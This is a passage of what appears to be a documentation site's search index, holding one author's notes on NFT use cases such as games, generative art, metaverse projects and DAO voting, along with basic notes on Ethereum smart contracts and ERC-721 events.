access"},{"location":"smart-contract-usage/exclusive-access/#exclusive-access","text":"","title":"Exclusive access"},{"location":"smart-contract-usage/exclusive-access/#marshmello","text":"The holder of the TinToy token will be invited to join one (1), ninety (90) minute virtual album listening party with Marshmello. In addition, this token is verifiable for: Invitation to a two (2) hour Studio Session with Marshmello and his one surprise guest Invitation to be a part of Marshmello\u2019s entourage for one (1) day at a show of your choice with a ten thousand dollar ($10,000) Mello credit Compete with Marshmello in COD or a mutually agreed upon game for one (1) hour Two (2) premium Vegas Residency tickets with additional backstage access to meet Marshmello One (1) Marshmello x x Aaron Kai Painted Helmet From auction were price ended at $5,5 million from tweet","title":"Marshmello"},{"location":"smart-contract-usage/exclusive-access/#kings-of-leon","text":"\"What comes with the NFT: 1 - Digital album download 1 - Limited edition NFT Golden Eye Vinyl 1 - Digital collectible album artwork\" - from OpenSea collection The NFT auction was performed at Yellowheart","title":"Kings of Leon"},{"location":"smart-contract-usage/exclusive-access/#veefriends","text":"\"VeeFriends is the name of Gary Vaynerchuk\u2019s NFT collection. He created VeeFriends to bring to life his ambitions of building a community around his creative and business passions using NFT technology and their smart contract capabilities.By owning a VeeFriend NFT, you immediately become part of the VeeFriends community and get access to VeeCon. All VeeFriends token owners get access to VeeCon. VeeCon is a multi-day event exclusively for NFT holders. Your NFT will give you a three year access pass. The conference will be focused around business, marketing, ideas, creativity, entrepreneurship, innovation, competition and of course, fun. Gary\u2019s focus is to curate the best experience for his community, bringing enormous access and informational value to all the VeeFriends token holders in attendance.\" - from veefriend's website","title":"VeeFriends"},{"location":"smart-contract-usage/fundraising/","text":"Fundraising Save Thousands of Lives - NooraHealth \"We will use the proceeds from the sale of this NFT to save lives. We estimate that with each $1,235 raised by selling it, we can save one life (and improve several more). At Noora Health, we train patients\u2019 families to take care of them after they leave the hospital. We work primarily with new mothers and their families in South Asia, where we are running programs in 165 hospitals. The data we've collected since October 2018 suggests we can save 9 babies per 1000 live births, at a cost of $1,235 per life saved.\" -from OpenSea listing Sold for 1337ETH","title":"Fundraising"},{"location":"smart-contract-usage/fundraising/#fundraising","text":"","title":"Fundraising"},{"location":"smart-contract-usage/fundraising/#save-thousands-of-lives-noorahealth","text":"\"We will use the proceeds from the sale of this NFT to save lives. We estimate that with each $1,235 raised by selling it, we can save one life (and improve several more). At Noora Health, we train patients\u2019 families to take care of them after they leave the hospital. We work primarily with new mothers and their families in South Asia, where we are running programs in 165 hospitals. The data we've collected since October 2018 suggests we can save 9 babies per 1000 live births, at a cost of $1,235 per life saved.\" -from OpenSea listing Sold for 1337ETH","title":"Save Thousands of Lives - NooraHealth"},{"location":"smart-contract-usage/games/","text":"Games Axieinfinity Signficance: Early pioneer with novel mechanics such as breeding. Amongst top grossing NFT projects Editions: Not sure \"Axie Infinity is a Pok\u00e9mon-inspired universe where anyone can earn tokens through skilled gameplay and contributions to the ecosystem. Players can battle, collect, raise, and build a land-based kingdom for their pets. All art assets and Axie genetic data can be easily accessed by 3rd parties, allowing community developers to build their own tools and experiences in the Axie Infinity universe. Although Axie is still in early access, Axie is ranked the #1 Ethereum game by daily, weekly, and monthly active users. It has generated over 6,400 ETH in revenue (2M+ USD) so far. While Axie is a fun game, it's also taken on characteristics of a social network and jobs platform due to the strong community and play to earn opportunities that have come from its early success. The key difference between Axie and a traditional game is that Blockchain economic design is used to reward our players for their contributions to the ecosystem. This new model of gaming has been dubbed \"play to earn\". Axie has attracted thousands of players from developing countries in the pursuit of a new income stream during the Covid pandemic. Many of these players are fathers, aunts, and even grandparents who have never used Blockchain technology before!\" - from Axie Infinity whitepaper One of the co-founders is Norwegian and can be followed at @Psycheout86 Cryptokitties Signficance: Early pioneer with novel mechanics Editions: Each is unique and more than 1 million kitties have been born \"What is CryptoKitties? CryptoKitties is a game centered around breedable, collectible, and oh-so-adorable creatures we call CryptoKitties! Each cat is one-of-a-kind and 100% owned by you; it cannot be replicated, taken away, or destroyed.\" - from project website Sorare - Global fantasy football Signficance: License with football clubs and user base potential Editions: Rarity of card determines number of editions from 1,10,100 and so on \"Sorare is a global fantasy football game where you can play with officially licensed digital cards and earn prizes every week. We are backed by a world-class team of investors, supported by gaming giant Ubisoft and already trusted by 100+ football clubs, with many more coming every month. A Sorare Card is an officially licensed digital collectible of a footballer for a particular football season. Thanks to blockchain technology, fans can collect their favourite players with the benefits of provable scarcity (fixed supply). On top of that, Sorare Cards are freely tradeable and usable in an open world of different applications and games. Each collectible enjoys many of the attributes of other blockchain-assets: it cannot be copied or taken away from you. Users also enjoy access to the complete digital history of the card. For the 2020-21 season, three levels of scarcity exist for each Sorare Card: Unique, Super Rare (10 copies) and Rare (100 copies).\" - from Sorare FAQ Kylian Mbapp\u00e9 was recently sold for 21ETH ZED RUN Signficance: Novel mechanics and live races on twitch Editions: Horse bloodlines from Z1 to Z268 determine rarity and editions \"ZED is a digital horse racing game where players can build a stable of racehorses by buying, breeding, and racing digital racehorses. The ultimate goal in ZED is to create a legacy with a valuable stable full of winning and rare racehorses. The more you breed and race, the greater your legacy becomes. Once your stable is formed with at least one racehorse, you can earn a profit if you decide to sell, breed or race!\" - from project website","title":"Games"},{"location":"smart-contract-usage/games/#games","text":"","title":"Games"},{"location":"smart-contract-usage/games/#axieinfinity","text":"Signficance: Early pioneer with novel mechanics such as breeding. Amongst top grossing NFT projects Editions: Not sure \"Axie Infinity is a Pok\u00e9mon-inspired universe where anyone can earn tokens through skilled gameplay and contributions to the ecosystem. Players can battle, collect, raise, and build a land-based kingdom for their pets. All art assets and Axie genetic data can be easily accessed by 3rd parties, allowing community developers to build their own tools and experiences in the Axie Infinity universe. Although Axie is still in early access, Axie is ranked the #1 Ethereum game by daily, weekly, and monthly active users. It has generated over 6,400 ETH in revenue (2M+ USD) so far. While Axie is a fun game, it's also taken on characteristics of a social network and jobs platform due to the strong community and play to earn opportunities that have come from its early success. The key difference between Axie and a traditional game is that Blockchain economic design is used to reward our players for their contributions to the ecosystem. This new model of gaming has been dubbed \"play to earn\". Axie has attracted thousands of players from developing countries in the pursuit of a new income stream during the Covid pandemic. Many of these players are fathers, aunts, and even grandparents who have never used Blockchain technology before!\" - from Axie Infinity whitepaper One of the co-founders is Norwegian and can be followed at @Psycheout86","title":"Axieinfinity"},{"location":"smart-contract-usage/games/#cryptokitties","text":"Signficance: Early pioneer with novel mechanics Editions: Each is unique and more than 1 million kitties have been born \"What is CryptoKitties? CryptoKitties is a game centered around breedable, collectible, and oh-so-adorable creatures we call CryptoKitties! Each cat is one-of-a-kind and 100% owned by you; it cannot be replicated, taken away, or destroyed.\" - from project website","title":"Cryptokitties"},{"location":"smart-contract-usage/games/#sorare-global-fantasy-football","text":"Signficance: License with football clubs and user base potential Editions: Rarity of card determines number of editions from 1,10,100 and so on \"Sorare is a global fantasy football game where you can play with officially licensed digital cards and earn prizes every week. We are backed by a world-class team of investors, supported by gaming giant Ubisoft and already trusted by 100+ football clubs, with many more coming every month. A Sorare Card is an officially licensed digital collectible of a footballer for a particular football season. Thanks to blockchain technology, fans can collect their favourite players with the benefits of provable scarcity (fixed supply). On top of that, Sorare Cards are freely tradeable and usable in an open world of different applications and games. Each collectible enjoys many of the attributes of other blockchain-assets: it cannot be copied or taken away from you. Users also enjoy access to the complete digital history of the card. For the 2020-21 season, three levels of scarcity exist for each Sorare Card: Unique, Super Rare (10 copies) and Rare (100 copies).\" - from Sorare FAQ Kylian Mbapp\u00e9 was recently sold for 21ETH","title":"Sorare - Global fantasy football"},{"location":"smart-contract-usage/games/#zed-run","text":"Signficance: Novel mechanics and live races on twitch Editions: Horse bloodlines from Z1 to Z268 determine rarity and editions \"ZED is a digital horse racing game where players can build a stable of racehorses by buying, breeding, and racing digital racehorses. The ultimate goal in ZED is to create a legacy with a valuable stable full of winning and rare racehorses. The more you breed and race, the greater your legacy becomes. Once your stable is formed with at least one racehorse, you can earn a profit if you decide to sell, breed or race!\" - from project website","title":"ZED RUN"},{"location":"smart-contract-usage/generative-art/","text":"Generative art Autoglyphs - 2019? Significance: Artwork lives on blockchain, from makers of CryptoPunks Editions: 512 \"Autoglyphs are the first \u201con-chain\u201d generative art on the Ethereum blockchain. They are a completely self-contained mechanism for the creation and ownership of an artwork. Autoglyphs are an experiment in generative art, each one unique and created by code running on the Ethereum blockchain. A glyph can be created by anyone who is willing to donate the creation fee of 0.20\u039e ($514) to our chosen charity, 350.org. The creator of the glyph will then also become the first owner of the glyph. However, after 512 glyphs have been created, the generator will shut itself off forever and the glyphs will only be available on the secondary market.\" - from developer website Autoglyphs on Opensea Art blocks Significance: Platform for generative art Editions: Typically around 1000 \"Art Blocks is a generative art platform that allows collectors to mint tokens without knowing what they will get ahead of time. The artist writes a code that is plugged into the platform, which will generate different combinations of the variables at random. The creator, Snowfro, came up with the idea when he was claiming CryptoPunks back in 2017, and he thought it was unfair that he got to claim a bunch of zombies. Over the next few years, he sold over 20 zombies to fund the development of Art Blocks.\" - from Meet Art Blocks: One of the Most Unique Platforms in NFTs Right Now A platform where the script to generate the art lives on the blockchain and where the parameters are determined when buyer initiates purchase. Art blocks on OpenSea Deafbeaf Significance: Audio focused generative art Editions: From 128 to 8 depending on series \"Synth Poems are short generative music pieces, inspired by the sound of analog synthesizers. They are stored on-chain. Each piece is generated at the time of minting from a random hash value, influencing musical elements including tempo, timbre, pitch and time signature. Simples rules lead to surprising variation, giving each piece it's own distinctive personality, while retaining a common theme. Although synth poems are audio focused, a fitting visualization is added as an ode to early computer graphics that used vector displays to visualize analog signals. What you see is a direct representation of the sound signal, as it would appear on an oscilloscope.\" - from artist's website Example works: Series 3: Entropy - Token 145 Series 4: Glitchbox - Token 208 Series 3 degrades in quality if it is transfered and series 4 allow the owner to experiment with parameters and change the art on the blockchain","title":"Generative art"},{"location":"smart-contract-usage/generative-art/#generative-art","text":"","title":"Generative art"},{"location":"smart-contract-usage/generative-art/#autoglyphs-2019","text":"Significance: Artwork lives on blockchain, from makers of CryptoPunks Editions: 512 \"Autoglyphs are the first \u201con-chain\u201d generative art on the Ethereum blockchain. They are a completely self-contained mechanism for the creation and ownership of an artwork. Autoglyphs are an experiment in generative art, each one unique and created by code running on the Ethereum blockchain. A glyph can be created by anyone who is willing to donate the creation fee of 0.20\u039e ($514) to our chosen charity, 350.org. The creator of the glyph will then also become the first owner of the glyph. However, after 512 glyphs have been created, the generator will shut itself off forever and the glyphs will only be available on the secondary market.\" - from developer website Autoglyphs on Opensea","title":"Autoglyphs - 2019?"},{"location":"smart-contract-usage/generative-art/#art-blocks","text":"Significance: Platform for generative art Editions: Typically around 1000 \"Art Blocks is a generative art platform that allows collectors to mint tokens without knowing what they will get ahead of time. The artist writes a code that is plugged into the platform, which will generate different combinations of the variables at random. The creator, Snowfro, came up with the idea when he was claiming CryptoPunks back in 2017, and he thought it was unfair that he got to claim a bunch of zombies. Over the next few years, he sold over 20 zombies to fund the development of Art Blocks.\" - from Meet Art Blocks: One of the Most Unique Platforms in NFTs Right Now A platform where the script to generate the art lives on the blockchain and where the parameters are determined when buyer initiates purchase. Art blocks on OpenSea","title":"Art blocks"},{"location":"smart-contract-usage/generative-art/#deafbeaf","text":"Significance: Audio focused generative art Editions: From 128 to 8 depending on series \"Synth Poems are short generative music pieces, inspired by the sound of analog synthesizers. They are stored on-chain. Each piece is generated at the time of minting from a random hash value, influencing musical elements including tempo, timbre, pitch and time signature. Simples rules lead to surprising variation, giving each piece it's own distinctive personality, while retaining a common theme. Although synth poems are audio focused, a fitting visualization is added as an ode to early computer graphics that used vector displays to visualize analog signals. What you see is a direct representation of the sound signal, as it would appear on an oscilloscope.\" - from artist's website Example works: Series 3: Entropy - Token 145 Series 4: Glitchbox - Token 208 Series 3 degrades in quality if it is transfered and series 4 allow the owner to experiment with parameters and change the art on the blockchain","title":"Deafbeaf"},{"location":"smart-contract-usage/metaverse-avatars/","text":"Metaverse avatars In addition to metaverse worlds, there is lot of activity around avatars and wearables for the metaverse. Standards for data formats of 3D avatars, such as VRM , are evolving quickly. Meebits \"The Meebits are 20,000 unique 3D voxel characters, created by a custom generative algorithm, then registered on the Ethereum blockchain. The NFT contract the governs ownership is a standard ERC-721 that works with any compatible service or exchange. Also included in the contract is a custom marketplace that supports like-kind trading of up to 100 Meebits per transaction, along with all the standard buy, bid and ask transactions.\" - from https://meebits.larvalabs.com/ Worth noticing that Meebits was developed by LarvaLabs who are also behind CryptoPunks and AutoGlyphs Genies \"Genies is not only one of the world\u2019s most innovative avatar technology companies, it is also creating digital identities that can be used across many platforms. Through Genies. celebrities and athletes can use digital identities to memorialize one of their life's defining moments and sell them as digital or virtual goods to their fans who want to share in their biggest life moments. \" - from Paving The Way For The Metaverse: Exclusive Interview With The CEO Of Genies About The 3D Avatar Company\u2019s Present And Future Genie are a well known brand for instagram and have now partnered with Dapper Labs (which is behind NBA Top Shots) and Unity. Genie will be running on the Flow blockchain developed by Dapper Labs based on the experience with NBA Top Shots Genie have license agreements with both Bandai Namco Entertainment, owner of Pacman, and Warner Music Group Ethlings \"Ethlings are a first-of-their-kind collection of NFTs that can be customized on the blockchain. An Ethling is a 1/1 ERC-721 token. When its minted it's given a serial number, a species, a subtype, and an assortment of up to 13 slots that can be customized. Some traits are rarer than others and having an Ethling with a rare species / subtype combination with a lot of customizable slots is hard to come by.\" - from project website Ethlings will be running on the Polygon blockchain.","title":"Metaverse avatars"},{"location":"smart-contract-usage/metaverse-avatars/#metaverse-avatars","text":"In addition to metaverse worlds, there is lot of activity around avatars and wearables for the metaverse. Standards for data formats of 3D avatars, such as VRM , are evolving quickly.","title":"Metaverse avatars"},{"location":"smart-contract-usage/metaverse-avatars/#meebits","text":"\"The Meebits are 20,000 unique 3D voxel characters, created by a custom generative algorithm, then registered on the Ethereum blockchain. The NFT contract the governs ownership is a standard ERC-721 that works with any compatible service or exchange. Also included in the contract is a custom marketplace that supports like-kind trading of up to 100 Meebits per transaction, along with all the standard buy, bid and ask transactions.\" - from https://meebits.larvalabs.com/ Worth noticing that Meebits was developed by LarvaLabs who are also behind CryptoPunks and AutoGlyphs","title":"Meebits"},{"location":"smart-contract-usage/metaverse-avatars/#genies","text":"\"Genies is not only one of the world\u2019s most innovative avatar technology companies, it is also creating digital identities that can be used across many platforms. Through Genies. celebrities and athletes can use digital identities to memorialize one of their life's defining moments and sell them as digital or virtual goods to their fans who want to share in their biggest life moments. \" - from Paving The Way For The Metaverse: Exclusive Interview With The CEO Of Genies About The 3D Avatar Company\u2019s Present And Future Genie are a well known brand for instagram and have now partnered with Dapper Labs (which is behind NBA Top Shots) and Unity. Genie will be running on the Flow blockchain developed by Dapper Labs based on the experience with NBA Top Shots Genie have license agreements with both Bandai Namco Entertainment, owner of Pacman, and Warner Music Group","title":"Genies"},{"location":"smart-contract-usage/metaverse-avatars/#ethlings","text":"\"Ethlings are a first-of-their-kind collection of NFTs that can be customized on the blockchain. An Ethling is a 1/1 ERC-721 token. When its minted it's given a serial number, a species, a subtype, and an assortment of up to 13 slots that can be customized. Some traits are rarer than others and having an Ethling with a rare species / subtype combination with a lot of customizable slots is hard to come by.\" - from project website Ethlings will be running on the Polygon blockchain.","title":"Ethlings"},{"location":"smart-contract-usage/metaverse-worlds/","text":"Metaverse worlds There is a lot of momentum behind the metaverse, a collective virtual space not controlled by any one actor. There many players in the space, for example it's expected Epic Games will make an announcement relatively soon as they have secured $1 billion dollars of funding recently Epic Games CEO Tim Sweeney elaborates what metaverse means for them. Blockchain technology allowing avatars and assets to be moved between worlds and traded is very likely to happen (though perhaps not directly on the Etherum blockchain) The Sandbox \"The Sandbox is a decentralised, community-driven gaming ecosystem where creators can share and monetise voxel assets and gaming experiences on the Ethereum blockchain. Using The Sandbox's free software, such as VoxEdit and the Game Maker, players can create ASSETs and games for themselves and to share with others. These can be monetised to earn the creator passive income.\" - from project's website Decentraland \"Decentraland is a decentralized virtual reality platform powered by the Ethereum blockchain. Within the Decentraland platform, users can create, experience, and monetize their content and applications. Enter and explore decentraland The finite, traversable, 3D virtual space within Decentraland is called LAND, a non-fungible digital asset maintained in an Ethereum smart contract. Land is divided into parcels that are identified by cartesian coordinates (x,y). These parcels are permanently owned by members of the community and are purchased using MANA, Decentraland\u2019s cryptocurrency token. This gives users full control over the environments and applications that they create, which can range from anything like static 3D scenes to more interactive applications or games.\" - from projects website Cryptovoxels \"Cryptovoxels is a virtual world built on the ethereum block chain. The world consists of a city called Origin City, which has streets, that are owned by The Corporation, and parcels, that are owned by individual people. If you have an ethereum wallet, you can buy a parcel.\" - from project's website Ember Sword From project's website","title":"Metaverse worlds"},{"location":"smart-contract-usage/metaverse-worlds/#metaverse-worlds","text":"There is a lot of momentum behind the metaverse, a collective virtual space not controlled by any one actor. There many players in the space, for example it's expected Epic Games will make an announcement relatively soon as they have secured $1 billion dollars of funding recently Epic Games CEO Tim Sweeney elaborates what metaverse means for them. Blockchain technology allowing avatars and assets to be moved between worlds and traded is very likely to happen (though perhaps not directly on the Etherum blockchain)","title":"Metaverse worlds"},{"location":"smart-contract-usage/metaverse-worlds/#the-sandbox","text":"\"The Sandbox is a decentralised, community-driven gaming ecosystem where creators can share and monetise voxel assets and gaming experiences on the Ethereum blockchain. Using The Sandbox's free software, such as VoxEdit and the Game Maker, players can create ASSETs and games for themselves and to share with others. These can be monetised to earn the creator passive income.\" - from project's website","title":"The Sandbox"},{"location":"smart-contract-usage/metaverse-worlds/#decentraland","text":"\"Decentraland is a decentralized virtual reality platform powered by the Ethereum blockchain. Within the Decentraland platform, users can create, experience, and monetize their content and applications. Enter and explore decentraland The finite, traversable, 3D virtual space within Decentraland is called LAND, a non-fungible digital asset maintained in an Ethereum smart contract. Land is divided into parcels that are identified by cartesian coordinates (x,y). These parcels are permanently owned by members of the community and are purchased using MANA, Decentraland\u2019s cryptocurrency token. This gives users full control over the environments and applications that they create, which can range from anything like static 3D scenes to more interactive applications or games.\" - from projects website","title":"Decentraland"},{"location":"smart-contract-usage/metaverse-worlds/#cryptovoxels","text":"\"Cryptovoxels is a virtual world built on the ethereum block chain. The world consists of a city called Origin City, which has streets, that are owned by The Corporation, and parcels, that are owned by individual people. If you have an ethereum wallet, you can buy a parcel.\" - from project's website","title":"Cryptovoxels"},{"location":"smart-contract-usage/metaverse-worlds/#ember-sword","text":"From project's website","title":"Ember Sword"},{"location":"smart-contract-usage/oracles/","text":"Oracles Oracles bridge real world events over to onchain smart contracts. It is an emerging field, but necessary for large parts of DeFi. As an example, a farmer's crop is at risk for draught and wants to insure himself against a season with low rainfall. An Oracle combining multuple sources into a reliable tamper-proof network will provide the weather events of the area and the smart contract can use them even though it's on chain. Chainlink appears to be well positioned in this space. Chainlink 2.0 whitepaper was recently published. As part of the ThinkWeek I watched the \"Chainlink 2.0 Whitepaper | Research Panel\" video below Earlier I've listend into the Lex Friedman podcast with one of the Chainlink co-founders Sergey Nazarov.","title":"Oracles"},{"location":"smart-contract-usage/oracles/#oracles","text":"Oracles bridge real world events over to onchain smart contracts. It is an emerging field, but necessary for large parts of DeFi. As an example, a farmer's crop is at risk for draught and wants to insure himself against a season with low rainfall. An Oracle combining multuple sources into a reliable tamper-proof network will provide the weather events of the area and the smart contract can use them even though it's on chain. Chainlink appears to be well positioned in this space. Chainlink 2.0 whitepaper was recently published. As part of the ThinkWeek I watched the \"Chainlink 2.0 Whitepaper | Research Panel\" video below Earlier I've listend into the Lex Friedman podcast with one of the Chainlink co-founders Sergey Nazarov.","title":"Oracles"},{"location":"smart-contract-usage/own-a-meme/","text":"Own a piece of internet history Nyan cat Nyan Cat sold for 300ETH $760,000.00 Overly attached girlfriend Overly attached girlfriend sold for 209ETH $509,940.00 Coordior Digital - Minecraft: The Last Minecart (2011) Corridor video Minecraf: The Last Minecraft sold for 16.28 ETH First Twitter Tweet First Twitter Tweet (first tweet posted by Twitter founder and CEO Jack Dorsey) sold for 1630ETH $2.9 million","title":"Own a piece of internet history"},{"location":"smart-contract-usage/own-a-meme/#own-a-piece-of-internet-history","text":"","title":"Own a piece of internet history"},{"location":"smart-contract-usage/own-a-meme/#nyan-cat","text":"Nyan Cat sold for 300ETH $760,000.00","title":"Nyan cat"},{"location":"smart-contract-usage/own-a-meme/#overly-attached-girlfriend","text":"Overly attached girlfriend sold for 209ETH $509,940.00","title":"Overly attached girlfriend"},{"location":"smart-contract-usage/own-a-meme/#coordior-digital-minecraft-the-last-minecart-2011","text":"Corridor video Minecraf: The Last Minecraft sold for 16.28 ETH","title":"Coordior Digital - Minecraft: The Last Minecart (2011)"},{"location":"smart-contract-usage/own-a-meme/#first-twitter-tweet","text":"First Twitter Tweet (first tweet posted by Twitter founder and CEO Jack Dorsey) sold for 1630ETH $2.9 million","title":"First Twitter Tweet"},{"location":"smart-contract-usage/voting/","text":"Voting Smart contract can define governance models for organisations such as Gitcoin, FlamingoDAO and MeebitsDAO. GitCoin \"Open source software is the foundation for coordination tools that will help humanity solve our toughest challenges. However, despite $500B+ in yearly economic output, developers have traditionally had no means to pay their rent while working on open source projects. This is why we built Gitcoin: A platform to fund builders looking for meaningful, open source work. We\u2019ve pioneered Quadratic Funding, a novel, democratic way to fund public goods in our quarterly Gitcoin Grants rounds. Since its launch in November 2017, Gitcoin Grants has now provided nearly $16M of funding to public goods.\" - from Introducing GTC \u2013 Gitcoin\u2019s Governance Token Smart contract is available via etherscan. FlamingoDAO \"Flamingo is an NFT-focused DAO that aims to explore emerging investment opportunities for ownable, blockchain-based assets. NFTs are not just cat pictures. They encompass digital art, collectibles, and in-game assets and other tangible assets. These new forms of digital property are poised to play an increasing role in helping to create, monetize, and incentivize online digital content. How do members vote? Members will be prompted to vote via Flamingo DApp (or, over time, other online services) at various points during the lifecycle of Flamingo, including to evaluate purchase decisions, weigh-in on the structure and form of Flamingo, and/or other strategic decisions related to Flamingo. Voting will be facilitated by blockchain-based smart contracts and via the DApp based on ownership records maintained on the Ethereum blockchain.\" -- from FlamingoDAOs website MeebitsDAO \"In our virtual government: 1 Meebit gets 1 Vote This will be managed by NFTs issued as Voting Seats which are exchangeable 1:1 with a Meebit. Voting seats are owned by actual people, of course, initially open to 200 Founder Representatives, each of whom may obtain up to 20 Voting Seats (NFTs).\" - from MeebitsDAO: How Voting Works","title":"Voting"},{"location":"smart-contract-usage/voting/#voting","text":"Smart contract can define governance models for organisations such as Gitcoin, FlamingoDAO and MeebitsDAO.","title":"Voting"},{"location":"smart-contract-usage/voting/#gitcoin","text":"\"Open source software is the foundation for coordination tools that will help humanity solve our toughest challenges. However, despite $500B+ in yearly economic output, developers have traditionally had no means to pay their rent while working on open source projects. This is why we built Gitcoin: A platform to fund builders looking for meaningful, open source work. We\u2019ve pioneered Quadratic Funding, a novel, democratic way to fund public goods in our quarterly Gitcoin Grants rounds. Since its launch in November 2017, Gitcoin Grants has now provided nearly $16M of funding to public goods.\" - from Introducing GTC \u2013 Gitcoin\u2019s Governance Token Smart contract is available via etherscan.","title":"GitCoin"},{"location":"smart-contract-usage/voting/#flamingodao","text":"\"Flamingo is an NFT-focused DAO that aims to explore emerging investment opportunities for ownable, blockchain-based assets. NFTs are not just cat pictures. They encompass digital art, collectibles, and in-game assets and other tangible assets. These new forms of digital property are poised to play an increasing role in helping to create, monetize, and incentivize online digital content. How do members vote? Members will be prompted to vote via Flamingo DApp (or, over time, other online services) at various points during the lifecycle of Flamingo, including to evaluate purchase decisions, weigh-in on the structure and form of Flamingo, and/or other strategic decisions related to Flamingo. Voting will be facilitated by blockchain-based smart contracts and via the DApp based on ownership records maintained on the Ethereum blockchain.\" -- from FlamingoDAOs website","title":"FlamingoDAO"},{"location":"smart-contract-usage/voting/#meebitsdao","text":"\"In our virtual government: 1 Meebit gets 1 Vote This will be managed by NFTs issued as Voting Seats which are exchangeable 1:1 with a Meebit. Voting seats are owned by actual people, of course, initially open to 200 Founder Representatives, each of whom may obtain up to 20 Voting Seats (NFTs).\" - from MeebitsDAO: How Voting Works","title":"MeebitsDAO"},{"location":"smart-contracts/","text":"Smart contracts Key takeaways: A smart contract has many of the same properties as a user account on ethereum To interact with the smart contract you create transactions where the data field is defined (value is not required but can be used to move ETH to the contract). The interaction will usually incur a transaction cost (gas in ETH). The interaction is executed in the Ethereum Virtual Machine (EVM) To create a smart contract you use a transaction (this can be quite price as you pay pr byte of code) Any state is defined in the smart contract and updating it is pricey as it is executed in the EVM and distributed to all ethereum nodes (first call more expensive than successive) You can query smart contract without incuring a transaction cost You can query events of a smart contract without incuring a transaction cost DApp is used to refer to decentralized applications which only use smart contracts as their backend. ETH.BUILD Strongly recommend Austin Griffith's video introduction using the https://eth.build/ tool. In order to understand smart contracts you should first understand transactions (assume reader knows blockchain fundamentals) Transactions - ETH.BUILD Smart Contracts - ETH.BUILD Other sources \"A smart contract is a program that runs at an address on Ethereum. They're made up of data and functions that can execute upon receiving a transaction.\" from https://ethereum.org/en/developers/docs/smart-contracts/anatomy/ \"You need to deploy your smart contract in order for it to be available to users of an Ethereum network. To deploy a smart contract, you merely send an Ethereum transaction containing the code of the compiled smart contract without specifying any recipients.\" from https://ethereum.org/en/developers/docs/smart-contracts/deploying/","title":"Overview"},{"location":"smart-contracts/#smart-contracts","text":"Key takeaways: A smart contract has many of the same properties as a user account on ethereum To interact with the smart contract you create transactions where the data field is defined (value is not required but can be used to move ETH to the contract). The interaction will usually incur a transaction cost (gas in ETH). The interaction is executed in the Ethereum Virtual Machine (EVM) To create a smart contract you use a transaction (this can be quite price as you pay pr byte of code) Any state is defined in the smart contract and updating it is pricey as it is executed in the EVM and distributed to all ethereum nodes (first call more expensive than successive) You can query smart contract without incuring a transaction cost You can query events of a smart contract without incuring a transaction cost DApp is used to refer to decentralized applications which only use smart contracts as their backend.","title":"Smart contracts"},{"location":"smart-contracts/#ethbuild","text":"Strongly recommend Austin Griffith's video introduction using the https://eth.build/ tool. In order to understand smart contracts you should first understand transactions (assume reader knows blockchain fundamentals)","title":"ETH.BUILD"},{"location":"smart-contracts/#transactions-ethbuild","text":"","title":"Transactions - ETH.BUILD"},{"location":"smart-contracts/#smart-contracts-ethbuild","text":"","title":"Smart Contracts - ETH.BUILD"},{"location":"smart-contracts/#other-sources","text":"\"A smart contract is a program that runs at an address on Ethereum. They're made up of data and functions that can execute upon receiving a transaction.\" from https://ethereum.org/en/developers/docs/smart-contracts/anatomy/ \"You need to deploy your smart contract in order for it to be available to users of an Ethereum network. To deploy a smart contract, you merely send an Ethereum transaction containing the code of the compiled smart contract without specifying any recipients.\" from https://ethereum.org/en/developers/docs/smart-contracts/deploying/","title":"Other sources"},{"location":"smart-contracts/code-on-blockchain/","text":"Learn how to put code on the blockchain","title":"Learn how to put code on the blockchain"},{"location":"smart-contracts/code-on-blockchain/#learn-how-to-put-code-on-the-blockchain","text":"","title":"Learn how to put code on the blockchain"},{"location":"smart-contracts/erc-721-best-practice/","text":"ERC721 Best practice OpenZeppelin OpenZeppelin is a setup of prevetted contracts by experts. In general, it's recommended to import their modules into your smart contract or at least take inspiration. Contracts are availble at the following github repo https://github.com/OpenZeppelin/openzeppelin-contracts . The even have wizard at https://wizard.openzeppelin.com/ Scaffold-eth Scaffold-eth appears to be a great set of tools for experimenting with smart contracts especially on test networks. You can easily run your own blockchain locally which you deploy the smart contract to and there is a reactjs ui automatically being generated for testing it. Introduction video:","title":"ERC-721 best practice"},{"location":"smart-contracts/erc-721-best-practice/#erc721-best-practice","text":"","title":"ERC721 Best practice"},{"location":"smart-contracts/erc-721-best-practice/#openzeppelin","text":"OpenZeppelin is a setup of prevetted contracts by experts. In general, it's recommended to import their modules into your smart contract or at least take inspiration. Contracts are availble at the following github repo https://github.com/OpenZeppelin/openzeppelin-contracts . The even have wizard at https://wizard.openzeppelin.com/","title":"OpenZeppelin"},{"location":"smart-contracts/erc-721-best-practice/#scaffold-eth","text":"Scaffold-eth appears to be a great set of tools for experimenting with smart contracts especially on test networks. You can easily run your own blockchain locally which you deploy the smart contract to and there is a reactjs ui automatically being generated for testing it. Introduction video:","title":"Scaffold-eth"},{"location":"smart-contracts/erc-721-events/","text":"Understanding smart contract events Event is an inheritable member of a contract. An event is emitted, it stores the arguments passed in transaction logs. These logs are stored on blockchain and are accessible using address of the contract till the contract is present on the blockchain. In the Ethereum universe, there is a single, canonical computer (called the Ethereum Virtual Machine, or EVM) whose state everyone on the Ethereum network agrees on. Everyone who participates in the Ethereum network (every Ethereum node) keeps a copy of the state of this computer. Additionally, any participant can broadcast a request for this computer to perform arbitrary computation. Whenever such a request is broadcast, other participants on the network verify, validate, and carry out (\u201cexecute\u201d) the computation. This causes a state change in the EVM, which is committed and propagated throughout the entire network. Requests for computation are called transaction requests; the record of all transactions as well as the EVM\u2019s present state is stored in the blockchain, which in turn is stored and agreed upon by all nodes. Events from ERC721 Transfer - This emits when ownership of any NFT changes by any mechanism. In addition, if from==0, event represent NFT creation, if to==0 even represent NFT destroyed Approval - This emits when the approved address for an NFT is changed or reaffirmed. ApprovalForAll - This emits when an operator is enabled or disabled for an owner. The operator can manage all NFTs of the owner. Querying events from the blockchain web3 can be used to query events from blockchain without paying gas.","title":"ERC-721 events"},{"location":"smart-contracts/erc-721-events/#understanding-smart-contract-events","text":"Event is an inheritable member of a contract. An event is emitted, it stores the arguments passed in transaction logs. These logs are stored on blockchain and are accessible using address of the contract till the contract is present on the blockchain. In the Ethereum universe, there is a single, canonical computer (called the Ethereum Virtual Machine, or EVM) whose state everyone on the Ethereum network agrees on. Everyone who participates in the Ethereum network (every Ethereum node) keeps a copy of the state of this computer. Additionally, any participant can broadcast a request for this computer to perform arbitrary computation. Whenever such a request is broadcast, other participants on the network verify, validate, and carry out (\u201cexecute\u201d) the computation. This causes a state change in the EVM, which is committed and propagated throughout the entire network. Requests for computation are called transaction requests; the record of all transactions as well as the EVM\u2019s present state is stored in the 